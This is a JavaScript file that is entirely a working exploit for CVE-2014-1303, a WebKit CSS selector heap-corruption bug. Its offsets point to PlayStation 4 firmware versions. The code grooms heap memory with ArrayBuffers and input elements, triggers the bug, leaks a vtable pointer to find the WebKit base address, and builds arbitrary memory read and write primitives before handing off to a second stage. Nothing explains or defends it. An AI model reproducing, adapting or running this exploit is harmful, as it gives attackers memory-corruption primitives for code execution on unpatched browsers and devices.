function exploit_CVE_2014_1303() {
	
	var arraybuffers = new Array(0x200);
	var inputs = new Array(0x100);
	var arraybufferviews = new Array(0x100);
	var primitive;
	var slave;
	
	  //alert('Aligning memory...');
	  // Align the memory how we want it
	  for (var i = 0; i < arraybuffers.length; i+=2) {
		  inputs[i/2] =  document.createElement("input");
		  inputs[i/2].type = "number";
		  arraybuffers[i] = new ArrayBuffer(0x40);
		  arraybuffers[i + 1] = new ArrayBuffer(0x20000);
	  }
	  // Trigger the vulnerability.
	  var cssRules = window.getMatchedCSSRules(document.documentElement);
	  cssRules[0].selectorText = 'a1,a2';
	  //alert("Vulnerability triggered!");
	
	// Userland pwnage
	try {
	  // We need to put ArrayBufferView objects where the inputs previously were
	  for (var i = 0; i < inputs.length; i+=1) {
			inputs[i].type = "";
			arraybufferviews[i] = new Uint32Array(arraybuffers[i/2]);
			// Need a value to find in memory
			arraybufferviews[i][0] = 0x77777777;
	  }
	  
	  var corrupted = undefined;
	  // Find the ArrayBuffer that has had it size modified
	  for (var i = 0; i < arraybuffers.length; ++i) {
		  if (arraybuffers[i].byteLength == 0xC0) {
			  corrupted = arraybuffers[i];
			  //alert("Found Corrupted ArrayBuffer!");
			  alert("Corrupted Index is 0x" + i.toString(16) + '!');
			  break;
		  }
	  }
	  
	  // If we find nothing, end the script
	  // Shouldn't happen based on how tcmalloc allocates memory
	  if (!corrupted) {
		alert("Couldn't find corrupted element...!");
		return;
	  }
	  primitive = new Uint32Array(corrupted);
	  
	  // Need to keep track of where the buffer is
	  	var old_low = primitive[0x14];
		var old_high = primitive[0x15];
		
		var vtable_ptr = new int64(primitive[0x10], primitive[0x11]);
		//alert("vtable:" + vtable_ptr);
		
		//var webKitBase = vtable_ptr.sub32(0x2600D80); // 3.55
		//var webKitBase = vtable_ptr.sub32(0x2615D18); // 3.15
		var webKitBase = vtable_ptr.sub32(0x2652C50); // 2.03
        alert("webKitBase: " + webKitBase);
		window.webKitBase = webKitBase;
		
	  // Need to find the arraybuffer that we have control over
	  primitive[0x18] += 0x10;
	  for (var i = 0; i < arraybufferviews.length;i++) {
		  tmp_array = arraybufferviews[i].subarray(0,arraybufferviews[i].length - 10);
		  if (tmp_array[0] != 0x77777777 && arraybufferviews[i].length > 0x40) {
			slave = arraybufferviews[i];
			primitive[0x18] -= 0x10;
			alert("Found ArrayBufferView that we have control over!");
			break;
		  }
	  }
		
		// Derive primitive functions
		var prim = {
			write8: function (addr, val) {
				primitive[0x14] = addr.low;
				primitive[0x15] = addr.hi;

				if (val == undefined)
					val = new int64(0,0);
				if (!(val instanceof int64))
					val = new int64(val,0);

				slave[0] = val.low;
				slave[1] = val.hi;

				primitive[0x14] = old_low;
				primitive[0x15] = old_high;
			},

			write4: function (addr, val) {
				primitive[0x14] = addr.low;
				primitive[0x15] = addr.hi;

				slave[0] = val;

				primitive[0x14] = old_low;
				primitive[0x15] = old_high;
			},

			read8: function (addr) {
				primitive[0x14] = addr.low;
				primitive[0x15] = addr.hi;

				var rtv = new int64(slave[0], slave[1]);

				primitive[0x14] = old_low;
				primitive[0x15] = old_high;

				return rtv;
			},

			// Add to wk_expl.js after read8 definition

			readable_read8: function (addr) {
				primitive[0x14] = addr.low;
				primitive[0x15] = addr.hi;
				
				var t0 = slave[0].toString(16);
				var t1 = slave[1].toString(16);
				
				var addZeroes = function (string8) {
					var newString8 = "0";
					var toAdd = 8 - string8.length;
					if (toAdd != 0) {
						//print("toAdd >" + toAdd);
						for (i = 1; i < toAdd; i++)
							newString8 += "0";
						//print(newString8 + string8);
						return newString8 + string8;
					}
					//print("toAdd >" + toAdd);
					//print(string8);
					return string8;
				};
				
				//print(t0 + ":"+ t0.length);
				var newT0 = addZeroes(t0).match(/[a-fA-F0-9]{2}/g).reverse().join('');
				//print(newT0);
				//print(t1 + ":"+ t1.length);
				var newT1 = addZeroes(t1).match(/[a-fA-F0-9]{2}/g).reverse().join('');
				//print(newT1);
				
				primitive[0x14] = old_low;
				primitive[0x15] = old_high;
				return newT0 + newT1;
			},
			
			read4: function (addr) {
				primitive[0x14] = addr.low;
				primitive[0x15] = addr.hi;

				var rtv = slave[0];

				primitive[0x14] = old_low;
				primitive[0x15] = old_high;

				return rtv;
			},

			leakval: function (jsval) {

			},

			createval: function (jsval) {

			}	
		};
		
		window.prim = prim;
			
		alert("done");
		
		p = window.prim;
		
		alert(p.read8(webKitBase));
		
		if (window.postExpl)
			window.stage2();
		
	} catch(e) {
		failed = true;
		fail("Exception: " + e);
	}
}